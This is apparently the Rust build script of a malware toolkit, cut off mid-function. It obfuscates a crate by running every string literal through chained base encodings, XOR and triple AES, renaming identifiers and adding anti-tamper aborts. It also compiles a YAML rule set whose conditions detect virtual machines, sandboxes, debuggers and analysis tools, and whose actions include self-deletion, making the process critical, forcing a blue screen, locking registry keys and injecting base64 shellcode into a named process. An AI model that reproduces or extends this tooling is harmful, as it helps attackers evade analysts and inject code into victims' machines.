// build.rs - full, self-contained
// Whole-crate obfuscator: string pipeline (base45->base85->base58->base32->base64->xor->hex->pad->AES-192->AES-128->AES-256)
// Identifier renaming + use-statement dedupe + fallback parsing.
// Anti-patching: Original string literal checksum verification.

use std::env;
use std::fs;
use std::path::Path;
use std::time::SystemTime;
use std::collections::{HashMap, HashSet};

use walkdir::WalkDir;
use rand::RngCore;
use rand::SeedableRng;
use rand::rngs::StdRng;

use quote::{quote, ToTokens};
use syn::fold::{self, Fold};
use syn::{Item, Attribute, Visibility, Expr, Ident, ItemFn, ItemImpl, ItemStatic, Stmt, File, ExprCall, ExprPath, ExprReference, ItemUse, ItemConst, ItemTrait};
use syn::visit::{self, Visit};
use syn::visit_mut::{self, VisitMut};


use base45;
use base85;
use base32;
use bs58;
use hex;

use getrandom;
use regex::Regex;
use serde::Deserialize;

/// ------------------ Configuration -----------------
const OBFUSCATE_AS_LIB: bool = false; // Set to true to obfuscate as a library
const SRC_DIR: &str = "src";
const OUT_FILE: &str = "src/obfuscated.rs";
const FORCE_REGEN: bool = true;

// --- YAML SIGNATURE LOGIC ---
#[derive(Debug, Deserialize)]
struct SignatureDatabase { #[serde(default)] pub rules: Vec<SignatureRule> }

#[derive(Debug, Deserialize)]
struct SignatureRule {
    pub id: String, pub name: String, pub description: String,
    pub conditions: Vec<SignatureCondition>,
    #[serde(default)] pub actions: Vec<Action>,
    pub match_type: MatchType,
}

#[derive(Debug, Deserialize)]
enum MatchType { All, Any, AtLeast(usize) }

#[derive(Debug, Deserialize)]
enum CpuidHypervisorType {
    Any,
    HyperV,
    VMware,
    VirtualBox,
    KVM,
    Xen,
    Parallels,
}

#[derive(Debug, Deserialize)]
#[serde(tag = "type")]
enum SignatureCondition {
    Hwid { field: HwidField, pattern: String, #[serde(default)] regex: bool },
    Registry { path: String, value_name: Option<String>, expected_data: Option<String> },
    File { path: String, #[serde(default)] must_exist: bool },
    Process { name: String, #[serde(default)] regex: bool },
    User { name: String, #[serde(default)] regex: bool },
    Service { name: String, #[serde(default)] must_be_running: bool },
    ScheduledTask { name: String, #[serde(default)] regex: bool },
    DiskModel { pattern: String, #[serde(default)] regex: bool },
    AnalysisDetected,
    CpuidHypervisor {
        hypervisor: CpuidHypervisorType,
    },

    CpuidVendor {
        pattern: String,
        #[serde(default)]
        regex: bool,
    },
    EventLogProvider {
        provider: String,
    },
}

#[derive(Debug, Deserialize)]
enum HwidField {
    ProcessorId, MotherboardSerial, BiosSerial, SystemUuid, MachineGuid,
    ProductId, ComputerName, MacAddress, DiskSerial, SystemModel,
}

#[derive(Debug, Deserialize)]
#[serde(tag = "type")]
enum Action {
    LockRegistry { path: String },
    SelfDelete, MakeCritical, Exit { code: i32 }, ForceBsod, CheckAnalysis,
    InjectDirect { process_name: String, shellcode_base64: String },
}

fn generate_yaml_signatures() {
    // Single signatures file - embedded directly into the executable
    let yaml_path = Path::new("signatures.yaml");
    println!("cargo:rerun-if-changed=signatures.yaml");
    
    if !yaml_path.exists() {
        // No signatures file, generate empty function
        let code = "//! Auto-generated signatures - embedded at compile time\nuse crate::{SignatureRule, SignatureCondition, MatchType, HwidField, Action, CpuidHypervisorType};\n\npub fn get_embedded_signatures() -> Vec<SignatureRule> { vec![] }\n";
        fs::write("src/generated_signatures.rs", code).expect("Failed to write generated_signatures.rs");
        return;
    }

    let content = fs::read_to_string(yaml_path).expect("Failed to read signatures.yaml");
    let db: SignatureDatabase = serde_yaml::from_str(&content).expect("Failed to parse signatures.yaml");

    let mut code = String::new();
    code.push_str("//! Auto-generated signatures - embedded at compile time\nuse crate::{SignatureRule, SignatureCondition, MatchType, HwidField, Action, CpuidHypervisorType};\n\n");
    code.push_str("pub fn get_embedded_signatures() -> Vec<SignatureRule> { vec![\n");

    for rule in db.rules {
        code.push_str("SignatureRule {\n");
        code.push_str(&format!("id: \"{}\".to_string(), name: \"{}\".to_string(), description: \"{}\".to_string(),\n", 
            escape(&rule.id), escape(&rule.name), escape(&rule.description)));
        code.push_str("conditions: vec![\n");
        for cond in &rule.conditions {
            match cond {
                SignatureCondition::Hwid { field, pattern, regex } => code.push_str(&format!("SignatureCondition::Hwid {{ field: HwidField::{:?}, pattern: \"{}\".to_string(), regex: {} }},\n", field, escape(pattern), regex)),
                SignatureCondition::Registry { path, value_name, expected_data } => code.push_str(&format!("SignatureCondition::Registry {{ path: \"{}\".to_string(), value_name: {}, expected_data: {} }},\n", escape(path), opt(value_name), opt(expected_data))),
                SignatureCondition::File { path, must_exist } => code.push_str(&format!("SignatureCondition::File {{ path: \"{}\".to_string(), must_exist: {} }},\n", escape(path), must_exist)),
                SignatureCondition::Process { name, regex } => code.push_str(&format!("SignatureCondition::Process {{ name: \"{}\".to_string(), regex: {} }},\n", escape(name), regex)),
                SignatureCondition::User { name, regex } => code.push_str(&format!("SignatureCondition::User {{ name: \"{}\".to_string(), regex: {} }},\n", escape(name), regex)),
                SignatureCondition::Service { name, must_be_running } => code.push_str(&format!("SignatureCondition::Service {{ name: \"{}\".to_string(), must_be_running: {} }},\n", escape(name), must_be_running)),
                SignatureCondition::ScheduledTask { name, regex } => code.push_str(&format!("SignatureCondition::ScheduledTask {{ name: \"{}\".to_string(), regex: {} }},\n", escape(name), regex)),
                SignatureCondition::DiskModel { pattern, regex } => code.push_str(&format!("SignatureCondition::DiskModel {{ pattern: \"{}\".to_string(), regex: {} }},\n", escape(pattern), regex)),
                SignatureCondition::AnalysisDetected => code.push_str("SignatureCondition::AnalysisDetected,\n"),
                SignatureCondition::CpuidHypervisor { hypervisor } => {
                    code.push_str(&format!(
                        "SignatureCondition::CpuidHypervisor {{ hypervisor: CpuidHypervisorType::{:?} }},\n",
                        hypervisor
                    ));
                }

                SignatureCondition::CpuidVendor { pattern, regex } => {
                    code.push_str(&format!(
                        "SignatureCondition::CpuidVendor {{ pattern: \"{}\".to_string(), regex: {} }},
",
                        escape(pattern),
                        regex
                    ));
                }
                SignatureCondition::EventLogProvider { provider } => {
                    code.push_str(&format!(
                        "SignatureCondition::EventLogProvider {{ provider: \"{}\".to_string() }},
",
                        escape(provider)
                    ));
                }
            }
        }
        code.push_str("],\nactions: vec![\n");
        for act in &rule.actions {
            match act {
                Action::LockRegistry { path } => code.push_str(&format!("Action::LockRegistry {{ path: \"{}\".to_string() }},\n", escape(path))),
                Action::SelfDelete => code.push_str("Action::SelfDelete,\n"),
                Action::MakeCritical => code.push_str("Action::MakeCritical,\n"),
                Action::Exit { code: c } => code.push_str(&format!("Action::Exit {{ code: {} }},\n", c)),
                Action::ForceBsod => code.push_str("Action::ForceBsod,\n"),
                Action::CheckAnalysis => code.push_str("Action::CheckAnalysis,\n"),
                Action::InjectDirect { process_name, shellcode_base64 } => code.push_str(&format!("Action::InjectDirect {{ process_name: \"{}\".to_string(), shellcode_base64: \"{}\".to_string() }},\n", escape(process_name), shellcode_base64)),
            }
        }
        let mt = match rule.match_type { MatchType::All => "MatchType::All".into(), MatchType::Any => "MatchType::Any".into(), MatchType::AtLeast(n) => format!("MatchType::AtLeast({})", n) };
        code.push_str(&format!("],\nmatch_type: {},\n}},\n", mt));
    }
    code.push_str("] }\n");
    fs::write("src/generated_signatures.rs", code).expect("Failed to write generated_signatures.rs");
}

fn escape(s: &str) -> String { s.replace('\\', "\\\\").replace('"', "\\\"").replace('\n', "\\n") }
fn opt(o: &Option<String>) -> String { match o { Some(s) => format!("Some(\"{}\".to_string())", escape(s)), None => "None".into() } }

/// -------------------------------------------------------------------------

/// Removes doc attributes from a vector of attributes to clean up the final output.
fn remove_doc_attrs(attrs: &mut Vec<Attribute>) {
    attrs.retain(|attr| !attr.path().is_ident("doc"));
}


/// Calculates a checksum for a slice of bytes. Used to verify string integrity.
fn calculate_checksum(data: &[u8]) -> u64 {
    let mut a = 1u64;
    let mut b = 0u64;
    for &byte in data {
        a = (a.wrapping_add(byte as u64)) % 65521;
        b = (b.wrapping_add(a)) % 65521;
    }
    (b << 32) | a
}

/// Simple inclusive range helper using RngCore::next_u64.
fn rnd_range_inclusive(rng: &mut impl RngCore, low: usize, high_inclusive: usize) -> usize {
    if low >= high_inclusive {
        return low;
    }
    let range = (high_inclusive - low + 1) as u64;
    let v = rng.next_u64();
    (low as u64 + (v % range)) as usize
}

/// modern random-bytes helper (uses RngCore::next_u64 or fill_bytes from provided rng)
fn generate_random_bytes(rng: &mut impl RngCore, size: usize) -> Vec<u8> {
    let mut buf = vec![0u8; size];
    rng.fill_bytes(&mut buf);
    buf
}

fn random_ident(len: usize, rng: &mut impl RngCore) -> String {
    const LETTERS: &[u8] = b"abcdefghijklmnopqrstuvwxyz";
    let words = rnd_range_inclusive(rng, 1, 3);
    let mut remaining = len;
    let mut parts = Vec::with_capacity(words);

    for i in 0..words {
        let word_len = if i + 1 == words {
            remaining
        } else {
            let max_possible = remaining - (words - i - 1);
            rnd_range_inclusive(rng, 1, max_possible)
        };
        remaining -= word_len;

        let mut part = String::with_capacity(word_len);
        for _ in 0..word_len {
            let idx = rnd_range_inclusive(rng, 0, LETTERS.len() - 1);
            part.push(LETTERS[idx] as char);
        }
        parts.push(part);
    }

    parts.join("_")
}

/// ---------------- String obfuscation module (with AES & base85/base58) ----------------
mod string_obfuscation {
    use super::*;
    use aes::cipher::{BlockEncrypt, KeyInit, generic_array::GenericArray};
    use aes::{Aes128, Aes192, Aes256};
    use base64::{engine::general_purpose, Engine as _};

    fn pad_pkcs7(data: &[u8], block_size: usize) -> Vec<u8> {
        let mut padded = data.to_vec();
        let pad_len = block_size - (data.len() % block_size);
        padded.extend(vec![pad_len as u8; pad_len]);
        padded
    }

    fn generate_aes_key(rng: &mut impl RngCore, size: usize) -> Vec<u8> {
        generate_random_bytes(rng, size)
    }

    /// Encodes then encrypts the string; returns (encrypted_bytes, combined_key)
    pub fn encode_string(input: &str, rng: &mut impl RngCore) -> (Vec<u8>, Vec<u8>) {
        // 1) base45
        let base45_encoded = base45::encode(input.as_bytes());

        // 2) base85 (was base85)
        let base85_encoded = base85::encode(base45_encoded.as_bytes());

        // 3) base58 (from bytes -> string)
        let base58_encoded = bs58::encode(base85_encoded.as_bytes()).into_string();

        // 4) base32 (RFC4648 padded)
        let base32_encoded = base32::encode(base32::Alphabet::Rfc4648 { padding: true }, base58_encoded.as_bytes());

        // 5) base64
        let base64_encoded = general_purpose::STANDARD.encode(base32_encoded.as_bytes());

        // 6) hex encode of base64 bytes
        let hex_encoded = hex::encode(base64_encoded.as_bytes());

        // XOR key (16 bytes)
        let xor_key = generate_aes_key(rng, 16);
        // XOR the hex-encoded ASCII bytes
        let mut xor_encoded: Vec<u8> = hex_encoded.as_bytes()
            .iter()
            .enumerate()
            .map(|(i, &b)| b ^ xor_key[i % xor_key.len()])
            .collect();

        // PKCS7 pad to 16-byte blocks before AES
        xor_encoded = pad_pkcs7(&xor_encoded, 16);

        // AES keys (192, 128, 256)
        let aes192_key = generate_aes_key(rng, 24);
        let aes128_key = generate_aes_key(rng, 16);
        let aes256_key = generate_aes_key(rng, 32);

        // AES-192 encrypt in-place (16-byte blocks)
        {
            let cipher192 = Aes192::new(GenericArray::from_slice(&aes192_key));
            for chunk in xor_encoded.chunks_mut(16) {
                let mut block = GenericArray::clone_from_slice(chunk);
                cipher192.encrypt_block(&mut block);
                chunk.copy_from_slice(&block);
            }
        }

        // AES-128 encrypt
        {
            let cipher128 = Aes128::new(GenericArray::from_slice(&aes128_key));
            for chunk in xor_encoded.chunks_mut(16) {
                let mut block = GenericArray::clone_from_slice(chunk);
                cipher128.encrypt_block(&mut block);
                chunk.copy_from_slice(&block);
            }
        }

        // AES-256 encrypt
        {
            let cipher256 = Aes256::new(GenericArray::from_slice(&aes256_key));
            for chunk in xor_encoded.chunks_mut(16) {
                let mut block = GenericArray::clone_from_slice(chunk);
                cipher256.encrypt_block(&mut block);
                chunk.copy_from_slice(&block);
            }
        }

        // Combine keys: xor_key || aes192 || aes128 || aes256
        let mut combined_key = xor_key.clone();
        combined_key.extend(aes192_key);
        combined_key.extend(aes128_key);
        combined_key.extend(aes256_key);

        (xor_encoded, combined_key)
    }

    
    /// Returns a runtime expression string like `decode_fn(&[bytes...], &[key...], 12345u64)`
    pub fn generate_obfuscated_string(original: &str, rng: &mut impl RngCore, decoder_fn_name: &str, expected_checksum: u64) -> String {
        let (encrypted_data, key) = encode_string(original, rng);
        
        // Ensure arrays are properly formatted
        let encrypted_array = encrypted_data
            .iter()
            .map(|b| format!("{}", b))
            .collect::<Vec<_>>()
            .join(",");
            
        let key_array = key
            .iter()
            .map(|b| format!("{}", b))
            .collect::<Vec<_>>()
            .join(",");
        
        // Use proper formatting with spaces for readability
        format!(
            "{}(&[{}],&[{}],{}u64)",
            decoder_fn_name,
            encrypted_array,
            key_array,
            expected_checksum
        )
    }
    pub fn generate_decoder_function(decoder_fn_name: &str, checksum_fn_name: &str) -> String {
    // Use unique placeholders that won't collide with real code braces.
    let template = r#"
#[inline(never)]
fn {CHECKSUM_FN}(data: &[u8]) -> u64 {
    let mut a = 1u64;
    let mut b = 0u64;
    for &byte in data {
        a = (a.wrapping_add(byte as u64)) % 65521;
        b = (b.wrapping_add(a)) % 65521;
    }
    (b << 32) | a
}

fn {DECODER_FN}(encrypted: &[u8], key: &[u8], expected_sum: u64) -> &'static str {
    let s: String = {
        use aes::cipher::{BlockDecrypt, KeyInit, generic_array::GenericArray};
        use aes::{Aes128, Aes192, Aes256};
        use base85; // using base85 for base85 decoding
        use bs58; // using bs58 for base58 decoding
        use base64::{engine::general_purpose, Engine as _};

        if key.len() < 88 { return Box::leak(String::from_utf8_lossy(encrypted).to_string().into_boxed_str()); }

        let xor_key = &key[0..16];
        let aes192_key = &key[16..40];
        let aes128_key = &key[40..56];
        let aes256_key = &key[56..88];

        let mut data = encrypted.to_vec();

        let cipher256 = Aes256::new(GenericArray::from_slice(aes256_key));
        for chunk in data.chunks_mut(16){
            let mut block = GenericArray::clone_from_slice(chunk);
            cipher256.decrypt_block(&mut block);
            chunk.copy_from_slice(&block);
        }

        let cipher128 = Aes128::new(GenericArray::from_slice(aes128_key));
        for chunk in data.chunks_mut(16){
            let mut block = GenericArray::clone_from_slice(chunk);
            cipher128.decrypt_block(&mut block);
            chunk.copy_from_slice(&block);
        }

        let cipher192 = Aes192::new(GenericArray::from_slice(aes192_key));
        for chunk in data.chunks_mut(16){
            let mut block = GenericArray::clone_from_slice(chunk);
            cipher192.decrypt_block(&mut block);
            chunk.copy_from_slice(&block);
        }

        if !data.is_empty() {
            let pad_len = data[data.len() - 1] as usize;
            if pad_len <= 16 && pad_len <= data.len() {
                data.truncate(data.len() - pad_len);
            }
        }

        let xor_decoded: Vec<u8> = data.iter().enumerate().map(|(i, &b)| b ^ xor_key[i % xor_key.len()]).collect();
        let hex_str = match String::from_utf8(xor_decoded) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base64_bytes = match hex::decode(&hex_str) { Ok(b) => b, Err(_) => return Box::leak(hex_str.into_boxed_str()) };
        let base64_str = match String::from_utf8(base64_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base32_bytes = match general_purpose::STANDARD.decode(&base64_str) { Ok(b) => b, Err(_) => return Box::leak(base64_str.into_boxed_str()) };
        let base32_str = match String::from_utf8(base32_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base58_bytes = match base32::decode(base32::Alphabet::RFC4648 { padding: true }, &base32_str) { Some(b) => b, None => return Box::leak(base32_str.into_boxed_str()) };
        let base58_str = match String::from_utf8(base58_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base85_bytes = match bs58::decode(&base58_str).into_vec() { Ok(b) => b, Err(_) => return Box::leak(base58_str.into_boxed_str()) };
        let base85_str = match String::from_utf8(base85_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };
        let base45_bytes = match base85::decode(&base85_str) { Ok(b) => b, Err(_) => return Box::leak(base85_str.into_boxed_str()) };
        let base45_str = match String::from_utf8(base45_bytes) { Ok(s) => s, Err(_) => return Box::leak("".into()) };

        match base45::decode(&base45_str) {
            Ok(final_bytes) => {
                let runtime_sum = {CHECKSUM_FN}(&final_bytes);
                if runtime_sum != expected_sum {
                    // Tampering detected! Simulated volatile write (to valid memory) then abort.
                    unsafe {
                        let mut dummy: u8 = 0;
                        std::ptr::write_volatile(&mut dummy, 1);
                    }
                    std::process::abort();
                }
                String::from_utf8_lossy(&final_bytes).to_string()
            },
            Err(_) => base45_str,
        }
    };
    Box::leak(s.into_boxed_str())
}
"#;

    // Replace unique placeholders with provided names
    let s = template
        .replace("{DECODER_FN}", decoder_fn_name)
        .replace("{CHECKSUM_FN}", checksum_fn_name);
    s 
 } 
}
/// Helper: detect presence of #[no_mangle] attribute
fn has_no_mangle(attrs: &Vec<Attribute>) -> bool {
    attrs.iter().any(|a| a.path().segments.iter().any(|s| s.ident == "no_mangle"))
}

/// Helper: detect proc-macro attributes
fn has_proc_macro_attr(attrs: &Vec<Attribute>) -> bool {
    attrs.iter().any(|a| {
        a.path().segments.iter().any(|s| {
            let id = s.ident.to_string();
            id == "proc_macro" || id == "proc_macro_attribute" || id == "proc_macro_derive"
        })
    })
}

/// detect extern "C" functions (best-effort)
fn is_extern_c_fn(item_fn: &ItemFn) -> bool {
    item_fn.sig.abi.is_some()
}

struct FullObfFold {
    ident_map: HashMap<String, String>,
    rng: StdRng,
    decoder_name: String,
    string_literals: HashMap<String, String>,
}

impl FullObfFold {
    pub fn new(map: HashMap<String, String>, rng: StdRng, decoder_name: String) -> Self {
        Self {
            ident_map: map,
            rng,
            decoder_name,
            string_literals: HashMap::new(),
        }
    }

    fn obf_name_for(&self, orig: &str) -> Option<Ident> {
        self.ident_map.get(orig).map(|s| Ident::new(s, proc_macro2::Span::call_site()))
    }

    fn obfuscate_string_literal(&mut self, literal: &str) -> String {
        if let Some(cached) = self.string_literals.get(literal) {
            return cached.clone();
        }
        if literal.len() <= 1 {
            let s = format!("\"{}\"", literal);
            self.string_literals.insert(literal.to_string(), s.clone());
            return s;
        }
        let expected_checksum = calculate_checksum(literal.as_bytes());
        let expr = string_obfuscation::generate_obfuscated_string(literal, &mut self.rng, &self.decoder_name, expected_checksum);
        self.string_literals.insert(literal.to_string(), expr.clone());
        expr
    }
}

impl Fold for FullObfFold {
    fn fold_item_use(&mut self, i: ItemUse) -> ItemUse {
        i
    }

    fn fold_item_fn(&mut self, i: ItemFn) -> ItemFn {
        let mut i = fold::fold_item_fn(self, i);

        let is_special_fn = is_extern_c_fn(&i) || has_no_mangle(&i.attrs);

        if !is_special_fn {
            if let Some(obf) = self.obf_name_for(&i.sig.ident.to_string()) {
                i.sig.ident = obf;
            }
        }
        i
    }

    fn fold_item_struct(&mut self, i: syn::ItemStruct) -> syn::ItemStruct {
        let mut i = i;
        if let Some(obf) = self.obf_name_for(&i.ident.to_string()) {
            i.ident = obf;
        }
        fold::fold_item_struct(self, i)
    }

    fn fold_item_enum(&mut self, i: syn::ItemEnum) -> syn::ItemEnum {
        let mut i = i;
        if let Some(obf) = self.obf_name_for(&i.ident.to_string()) {
            i.ident = obf;
        }
        fold::fold_item_enum(self, i)
    }

    fn fold_item_static(&mut self, i: ItemStatic) -> ItemStatic {
        let mut i = i;
        if let Some(obf_ident) = self.obf_name_for(&i.ident.to_string()) {
            i.ident = obf_ident;
        }
        fold::fold_item_static(self, i)
    }
    
    fn fold_item_const(&mut self, i: ItemConst) -> ItemConst {
        let mut i = i;
        if let Some(obf_ident) = self.obf_name_for(&i.ident.to_string()) {
            i.ident = obf_ident;
        }
        fold::fold_item_const(self, i)
    }

    fn fold_item_trait(&mut self, i: ItemTrait) -> ItemTrait {
        let mut i = i;
        if let Some(obf_ident) = self.obf_name_for(&i.ident.to_string()) {
            i.ident = obf_ident;
        }
        fold::fold_item_trait(self, i)
    }
    
    fn fold_item_impl(&mut self, i: ItemImpl) -> ItemImpl {
        let mut i = i;
        if i.trait_.is_none() {
            i.self_ty = Box::new(self.fold_type(*i.self_ty));
        }
        fold::fold_item_impl(self, i)
    }

    fn fold_path(&mut self, mut path: syn::Path) -> syn::Path {
        // CRITICAL: Don't rename paths that reference external crates
        // Check if the path starts with an external crate name
        if let Some(first_seg) = path.segments.first() {
            let first_name = first_seg.ident.to_string();
            // List of external crates - do NOT rename anything in these paths
            const EXTERNAL_CRATES: &[&str] = &[
                "anti_vm", "anti_sandbox", "anti_debug_rust",
                "std", "core", "alloc", "windows", "winapi", "windows_sys", // Added windows_sys
                "once_cell", "lazy_static", "serde", "tokio",
            ];
            
            if EXTERNAL_CRATES.contains(&first_name.as_str()) {
                // This is an external crate path - return it COMPLETELY unchanged
                // Do NOT rename ANY segments in this path
                return path;
            }
        }
        
        // Handle `crate::module::Item` paths by stripping `crate::module::`
        if path.segments.len() > 1 && path.segments.first().unwrap().ident == "crate" {
            let segments_after_crate: Vec<_> = path.segments.iter().skip(1).collect();
            if !segments_after_crate.is_empty() {
                let module_name = &segments_after_crate.first().unwrap().ident.to_string();
                if self.ident_map.contains_key(module_name) {
                    let last_seg = segments_after_crate.last().unwrap().clone();
                    let mut new_segments = syn::punctuated::Punctuated::new();
                    new_segments.push(last_seg.clone());
                    path.segments = new_segments;
                }
            }
        }
        // Heuristic to flatten local module paths like `mymodule::myitem`
        else if path.segments.len() > 1 && path.leading_colon.is_none() {
            let first_seg_name = path.segments.first().unwrap().ident.to_string();
            if self.ident_map.contains_key(&first_seg_name) {
                let last_seg = path.segments.pop().unwrap().into_value();
                let mut new_segments = syn::punctuated::Punctuated::new();
                new_segments.push(last_seg);
                path.segments = new_segments;
            }
        }

        // Now, rename the identifier(s) in the possibly-modified path - BUT ONLY FOR LOCAL CODE
        // Skip renaming if ANY segment matches an external crate
        let has_external_crate = path.segments.iter().any(|seg| {
            let name = seg.ident.to_string();
            name == "anti_vm" || name == "anti_sandbox" || name == "anti_debug_rust" 
                || name == "std" || name == "core" || name == "alloc" || name == "windows_sys"
        });
        
        if !has_external_crate {
            for segment in path.segments.iter_mut() {
                let ident_str = segment.ident.to_string();
                if let Some(new_name) = self.ident_map.get(&ident_str) {
                    segment.ident = Ident::new(new_name, segment.ident.span());
                }
            }
        }
        
        path
    }

    fn fold_expr_method_call(&mut self, call: syn::ExprMethodCall) -> syn::ExprMethodCall {
        let mut call = call;

        // Common external/trait methods we must NOT rename
        // Expand this list as you encounter more false-positives.
        const SKIP_METHODS: &[&str] = &[
            // rand RngCore / Rng methods
            "next_u32", "next_u64", "fill_bytes", "try_fill_bytes", "gen", "gen_range", "from_seed",
            // commonly used RNG wrappers
            "next", "sample", "sample_single",
            // common standard methods that break when renamed
            "to_string", "as_ref", "as_mut", "len", "is_empty", "push", "pop",
            // other helper names you rely on
            "clone", "iter", "next", "expect", "into", "collect", "resize", "encode_utf16"
        ];

        // Names of receiver idents or path segments that strongly indicate an RNG or external object.
        // If the method is called on a receiver with one of these names, we avoid renaming the method.
        const RNG_RECEIVER_HINTS: &[&str] = &[
            "rng", "r", "prng", "rnd", "random", "rand", "StdRng", "thread_rng", "ChaChaRng",
        ];

        let method_name = call.method.to_string();

        // If method is an explicit skip, return early (do not rename).
        if SKIP_METHODS.contains(&method_name.as_str()) {
            return fold::fold_expr_method_call(self, call);
        }

        // Heuristic: if receiver is a simple path like `rng` or `rand::something` that contains RNG hints, skip rename.
        // `call.receiver` is an Expr; check for Expr::Path and inspect the last segment.
        let skip_based_on_receiver = match &*call.receiver {
            Expr::Path(expr_path) => {
                if let Some(seg) = expr_path.path.segments.last() {
                    let seg_name = seg.ident.to_string();
                    RNG_RECEIVER_HINTS.iter().any(|h| *h == seg_name)
                } else {
                    false
                }
            }
            // If receiver is method chain like `self.rng` or `some.var.rng`, try to inspect the last segment tokenized.
            Expr::Field(field_expr) => {
                // field_expr.member may be an Ident or Index; handle Ident
                match &field_expr.member {
                    syn::Member::Named(ident) => RNG_RECEIVER_HINTS.iter().any(|h| *h == ident.to_string()),
                    _ => false,
                }
            }
            _ => false,
        };

        if skip_based_on_receiver {
            return fold::fold_expr_method_call(self, call);
        }

        // Finally, regular renaming behavior: rename only if present in ident_map.
        if let Some(new_name) = self.ident_map.get(&method_name) {
            call.method = Ident::new(new_name, call.method.span());
        }

        fold::fold_expr_method_call(self, call)
    }

    fn fold_expr(&mut self, expr: Expr) -> Expr {
        if let Expr::Lit(lit_expr) = &expr {
            // Handle string literals
            if let syn::Lit::Str(str_lit) = &lit_expr.lit {
                let original = str_lit.value();
                if !original.is_empty() {
                    let obf_expr_str = self.obfuscate_string_literal(&original);
                    if let Ok(parsed_expr) = syn::parse_str::<Expr>(&obf_expr_str) {
                        return parsed_expr;
                    }
                }
            }

            // Handle integer literals to make patching harder
            if let syn::Lit::Int(int_lit) = &lit_expr.lit {
                if let Ok(val) = int_lit.base10_parse::<i128>() {
                    // Avoid changing small, common values that are often part of control flow or array indices
                    // Also avoid values that would cause invalid ranges
                    if val.abs() > 10 {
                        let upper_bound = (val / 2).abs().max(2);

                        if upper_bound > 1 {
                            let upper_bound_usize: usize = (upper_bound - 1).try_into().unwrap_or(1);
                            let part1 = rnd_range_inclusive(&mut self.rng, 1, upper_bound_usize) as i128;
                            let part2 = val - part1;

                            let expr_str = format!("({} + {})", part1, part2);

                            let final_expr_str = if !int_lit.suffix().is_empty() {
                                format!("({} as {})", expr_str, int_lit.suffix())
                            } else {
                                expr_str
                            };

                            if let Ok(parsed_expr) = syn::parse_str::<Expr>(&final_expr_str) {
                                return parsed_expr;
                            }
                        }
                    }
                }
            }
        }
        // If it wasn't a literal we handled, continue the fold traversal
        fold::fold_expr(self, expr)
    }
}


/// Whether a visibility is public
fn is_visibility_public(vis: &Visibility) -> bool {
    matches!(vis, Visibility::Public(_))
}

/// Collect identifiers used as arguments to OsStr::new(...) or OsString::from(...)
fn collect_osstr_vars_from_file(ast: &File, out: &mut HashSet<String>) {
    // recursively walk expressions in items
    fn walk_expr(expr: &Expr, out: &mut HashSet<String>) {
        match expr {
            Expr::Call(ExprCall { func, args, .. }) => {
                // look for paths like `OsStr::new` or `std::ffi::OsStr::new`
                if let Expr::Path(ExprPath { path, .. }) = &**func {
                    if let Some(last) = path.segments.last() {
                        let last_name = last.ident.to_string();
                        if last_name == "new" || last_name == "from" {
                            // check if any segment equals OsStr or OsString
                            if path.segments.iter().any(|seg| {
                                let s = seg.ident.to_string();
                                s == "OsStr" || s == "OsString"
                            }) {
                                // collect first argument if it's a plain ident/path
                                if let Some(first_arg) = args.first() {
                                    match first_arg {
                                        Expr::Path(ExprPath { path: arg_path, .. }) => {
                                            if arg_path.segments.len() == 1 {
                                                out.insert(arg_path.segments[0].ident.to_string());
                                            }
                                        }
                                        Expr::Reference(ExprReference { expr: inner, .. }) => {
                                            if let Expr::Path(ExprPath { path: arg_path, .. }) = &**inner {
                                                if arg_path.segments.len() == 1 {
                                                    out.insert(arg_path.segments[0].ident.to_string());
                                                }
                                            }
                                        }
                                        _ => {}
                                    }
                                 }
                            }
                        }
                    }
                }
                // walk into call arguments
                for a in args {
                    walk_expr(a, out);
                }
            }

            Expr::MethodCall(mcall) => {
                for arg in &mcall.args { walk_expr(arg, out); }
                walk_expr(&mcall.receiver, out);
            }

            Expr::Block(b) => {
                for stmt in &b.block.stmts {
                    match stmt {
                        Stmt::Expr(e, _) => walk_expr(e, out),
                        Stmt::Local(local) => {
                            if let Some(init) = &local.init {
                                walk_expr(&init.expr, out);
                            }
                        }
                        _ => {}
                    }
                }
            }

            Expr::If(ifexpr) => {
                walk_expr(&*ifexpr.cond, out);
                for stmt in &ifexpr.then_branch.stmts {
                    match stmt {
                        Stmt::Expr(e, _) => walk_expr(e, out),
                        Stmt::Local(local) => {
                            if let Some(init) = &local.init {
                                walk_expr(&init.expr, out);
                            }
                        }
                        _ => {}
                    }
                }
                if let Some((_else_token, else_expr)) = &ifexpr.else_branch {
                    walk_expr(&*else_expr, out);
                }
            }

            Expr::Match(m) => {
                walk_expr(&*m.expr, out);
                for arm in &m.arms {
                    walk_expr(&*arm.body, out);
                }
            }

            Expr::ForLoop(fl) => {
                for stmt in &fl.body.stmts {
                    match stmt {
                        Stmt::Expr(e, _) => walk_expr(e, out),
                        Stmt::Local(local) => {
                            if let Some(init) = &local.init {
                                walk_expr(&init.expr, out);
                            }
                        }
                        _ => {}
                    }
                }
            }
            
            Expr::While(w) => {
                for stmt in &w.body.stmts {
                    match stmt {
                        Stmt::Expr(e, _) => walk_expr(e, out),
                        Stmt::Local(local) => {
                            if let Some(init) = &local.init {
                                walk_expr(&init.expr, out);
                            }
                        }
                        _ => {}
                    }
                }
            }
            
            Expr::Loop(l) => {
                for stmt in &l.body.stmts {
                    match stmt {
                        Stmt::Expr(e, _) => walk_expr(e, out),
                        Stmt::Local(local) => {
                            if let Some(init) = &local.init {
                                walk_expr(&init.expr, out);
                            }
                        }
                        _ => {}
                    }
                }
            }

            Expr::Closure(clos) => {
                walk_expr(&*clos.body, out);
            }

            _ => {}
        }
    }

    // walk top-level items
    for item in &ast.items {
        match item {
            Item::Fn(f) => {
                for stmt in &f.block.stmts {
                    match stmt {
                        Stmt::Expr(e, _) => walk_expr(e, out),
                        Stmt::Local(local) => {
                            if let Some(init) = &local.init {
                                walk_expr(&init.expr, out);
                            }
                        }
                        _ => {}
                    }
                }
            }
            Item::Mod(m) => {
                if let Some((_, items)) = &m.content {
                    let fake = File {
                        shebang: None,
                        attrs: Vec::new(),
                        items: items.clone(),
                    };
                    collect_osstr_vars_from_file(&fake, out);
                }
            }
            _ => {}
        }
    }
}

/// Reads and parses all source paths and returns identifiers used in OsStr/OsString calls.
fn collect_osstr_vars_from_sources(paths: &[std::path::PathBuf]) -> HashSet<String> {
    let mut preserved = HashSet::new();
